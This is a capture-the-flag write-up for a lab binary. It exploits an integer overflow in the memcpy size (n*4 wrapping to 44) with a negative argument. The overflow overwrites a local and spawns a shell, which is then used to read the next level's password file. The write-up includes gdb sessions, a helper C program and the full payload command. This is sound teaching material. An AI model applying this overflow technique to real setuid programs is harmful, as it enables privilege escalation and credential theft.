## Over and under the flow (bonus1)

This [binary](source.c) takes at least an argument or it segfaults. The
[atoi](https://linux.die.net/man/3/atoi) function is called on it. The result,
let's call it _n_ must be less than 10 for the second argument to be copied
into _main_'s local buffer. Finally _n_ must be equal to 0x574f4c46 for
[execl](https://linux.die.net/man/3/execl) to open a shell.

A simple [memcpy](https://linux.die.net/man/3/memcpy) is used to copy the second
argument's contents into _main_'s 40 bytes _buffer_. The size parameter passed
to is is _n_ * 4. So the name of the game here is to find a value for that will
pass the first test (be less than 10) and that multiplied by 4 will underflow to
a value big enough for overwring _n_ itself with the value it is compared
against.

First, skip the first test and find a working payload for the second argument:

```shell
# run gdb on the binary
gdb ./bonus1
# see the main
(gdb) disass main
Dump of assembler code for function main:
...
0x08048468 <+68>:    mov    %ecx,0x8(%esp)
0x0804846c <+72>:    mov    %edx,0x4(%esp)
0x08048470 <+76>:    mov    %eax,(%esp)
0x08048473 <+79>:    call   0x8048320 <memcpy@plt>
0x08048478 <+84>:    cmpl   $0x574f4c46,0x3c(%esp)
...
End of assembler dump.
# break just before the memcpy call to see its arguments
(gdb) b *0x08048473
Breakpoint 1 at 0x8048473
# run with 1 as a value for n and what should be our payload
(gdb) run 1 `python -c 'print "a" * 40 + "\x57\x4f\x4c\x46"[::-1]`
Starting program: /home/user/bonus1/bonus1 1 `python -c 'print "a" * 40 + "\x57\x4f\x4c\x46"[::-1]'`

Breakpoint 1, 0x08048473 in main ()
# the destination buffer
(gdb) x $eax
0xbffffaf4:     0x00080000
# the second argument (argv[2])
(gdb) x $edx
0xbffffd2a:     0x61616161
# the n value * 4 for the size
(gdb) x $ecx
0x4:    Cannot access memory at address 0x4
# which is located here
(gdb) x $esp + 8
0xbffffae8:     0x00000004
# if we replace it with the length of our payload
(gdb) set *0xbffffae8 = 44
(gdb) x $esp + 8
0xbffffae8:     0x0000002c
# and run
(gdb) c
Continuing.
# we're in
process 22942 is executing new program: /bin/dash
```

Now that we our payload works, let's get the value of _n_ we need with the help
of this little program:

```C
#include <stdio.h>
#include <stdlib.h>

int	main(int argc, char **argv)
{
	int	n = 0;

	if (argc > 1)
		n = atoi(argv[1]);
	else
		for (n = -1; n < 0 && n * 4 != 44; --n);
	printf("%d * 4 = %d\n", n, n * 4);
	return (0);
}
```

It will simply loop on negative values starting with -1 (which way too high by
the way, since it will not underflow until at least INT32\_MAX/4, but who
cares?) and stop when it finds a negative value that multiplied by 4 will
underflow to 44, which is the number of bytes we want to write to change _n_'s
value.

```shell
# compile the program
gcc underflow.c
# run it
./a.out
-1073741813 * 4 = 44
```

And there we go. A value that will both pass the first test and make it so the
payload is written as it should.

```shell
# set the arguments
N=-1073741813
PAYLOAD=$(python -c 'print "a" * 40 + "\x57\x4f\x4c\x46"[::-1]')
# run the program
./bonus1 $N $PAYLOAD
# enjoy your shell
$ whoami
bonus2
$ cat /home/user/bonus2/.pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```

And we're done!
